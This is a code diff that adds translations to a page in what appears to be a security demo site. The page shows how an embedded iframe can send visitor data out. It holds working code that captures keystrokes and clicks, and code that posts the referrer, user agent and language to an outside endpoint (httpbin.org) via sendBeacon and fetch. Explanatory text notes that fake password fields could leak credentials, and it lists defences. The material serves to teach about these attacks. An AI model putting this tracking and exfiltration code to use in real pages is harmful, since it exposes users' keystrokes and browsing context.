@@ -5,6 +5,8 @@ import { findScenario } from "@/lib/scenarios";
 import { ScenarioHeader } from "@/app/ScenarioHeader";
 import { EmbedSnippet } from "@/app/EmbedSnippet";
 import { Log, useLog } from "@/app/Log";
+import { I18N } from "./i18n";
+import { fmt, usePageI18n } from "../usePageI18n";
 
 const EXFIL_ENDPOINT = "https://httpbin.org/post";
 
@@ -12,14 +14,15 @@ const BeaconExfilPage = () => {
   const scenario = findScenario("beacon-exfil")!;
   const { lines, push, clear } = useLog();
   const [tracking, setTracking] = useState(false);
+  const t = usePageI18n(I18N);
 
   useEffect(() => {
     if (!tracking) return;
     const onClick = (e: MouseEvent) => {
-      push(`click 좌표 수집: x=${e.clientX} y=${e.clientY}`);
+      push(fmt(t.log.clickCapture, { x: e.clientX, y: e.clientY }));
     };
     const onKey = (e: KeyboardEvent) => {
-      push(`key 수집: "${e.key}" (실제 공격이라면 비밀번호도 그대로 수집)`);
+      push(fmt(t.log.keyCapture, { key: e.key }));
     };
     window.addEventListener("click", onClick);
     window.addEventListener("keydown", onKey);
@@ -35,18 +38,18 @@ const BeaconExfilPage = () => {
       referrer: document.referrer,
       ua: navigator.userAgent,
       lang: navigator.language,
-      // parent origin 은 cross-origin 이면 직접 못 읽지만, document.referrer 로 추정 가능
+      // Cross-origin parent origin cannot be read directly, but referrer may expose it.
     };
-    push(`navigator.sendBeacon("${EXFIL_ENDPOINT}", ...)`);
+    push(fmt(t.log.sendingBeacon, { endpoint: EXFIL_ENDPOINT }));
     const ok = navigator.sendBeacon(
       EXFIL_ENDPOINT,
       new Blob([JSON.stringify(payload)], { type: "application/json" })
     );
-    push(`결과: ${ok ? "전송 큐 들어감" : "실패"}`);
+    push(fmt(t.log.beaconResult, { result: ok ? "queued" : "failed" }));
   };
 
   const sendFetch = async () => {
-    push(`fetch POST → ${EXFIL_ENDPOINT}`);
+    push(fmt(t.log.sendingFetch, { endpoint: EXFIL_ENDPOINT }));
     try {
       const res = await fetch(EXFIL_ENDPOINT, {
         method: "POST",
@@ -57,9 +60,9 @@ const BeaconExfilPage = () => {
           ts: Date.now(),
         }),
       });
-      push(`응답 status=${res.status}`);
+      push(fmt(t.log.fetchStatus, { status: res.status }));
     } catch (e) {
-      push(`실패: ${(e as Error).message}`);
+      push(fmt(t.log.failed, { message: (e as Error).message }));
     }
   };
 
@@ -68,50 +71,41 @@ const BeaconExfilPage = () => {
       <ScenarioHeader scenario={scenario} />
       <EmbedSnippet slug="beacon-exfil" />
 
-      <h2>실행</h2>
+      <h2>{t.actionsHeading}</h2>
       <div className="kv">
-        <div className="k">document.referrer</div>
+        <div className="k">{t.text.referrerLabel}</div>
         <div>
-          <code>{typeof window === "undefined" ? "-" : document.referrer || "(없음)"}</code>
+          <code>
+            {typeof window === "undefined" ? "-" : document.referrer || t.log.empty}
+          </code>
         </div>
-        <div className="k">navigator.userAgent</div>
+        <div className="k">{t.text.uaLabel}</div>
         <div>
           <code>{typeof window === "undefined" ? "-" : navigator.userAgent}</code>
         </div>
       </div>
       <div className="actions">
         <button className="danger" onClick={sendBeacon}>
-          sendBeacon 으로 전송
+          {t.buttons.beacon}
         </button>
         <button className="danger" onClick={sendFetch}>
-          fetch 로 전송
+          {t.buttons.fetch}
         </button>
         <button
           className={tracking ? "danger" : ""}
           onClick={() => setTracking((t) => !t)}
         >
-          {tracking ? "키/클릭 수집 끄기" : "키/클릭 수집 켜기"}
+          {tracking ? t.buttons.trackingOff : t.buttons.trackingOn}
         </button>
-        <button onClick={clear}>로그 초기화</button>
+        <button onClick={clear}>{t.buttons.clearLog}</button>
       </div>
       <Log lines={lines} />
 
-      <h2>해설</h2>
+      <h2>{t.explanationHeading}</h2>
       <ul>
-        <li>
-          iframe 안에서 일어난 클릭/키 입력은 자기 origin 이라 자유롭게 수집할 수
-          있습니다. iframe 위에 가짜 입력 필드를 두면 사용자가 거기 친 비밀번호
-          그대로 attacker 서버로 보낼 수 있습니다.
-        </li>
-        <li>
-          <code>document.referrer</code> 로 부모 페이지 URL 의 origin / path 까지
-          확인 가능합니다 (Referrer-Policy 에 따라 다름). 어떤 문서, 게시글,
-          대시보드에 임베드됐는지 추적할 수 있습니다.
-        </li>
-        <li>
-          이 공격은 진짜 데이터 탈취에 가장 가깝습니다. 대응은 sandbox 빈 값으로
-          JS 자체를 막거나 호스트 allowlist 로 신뢰 도메인만 허용하는 것.
-        </li>
+        {(t.explanation ?? []).map((html, i) => (
+          <li key={i} dangerouslySetInnerHTML={{ __html: html }} />
+        ))}
       </ul>
     </>
   );
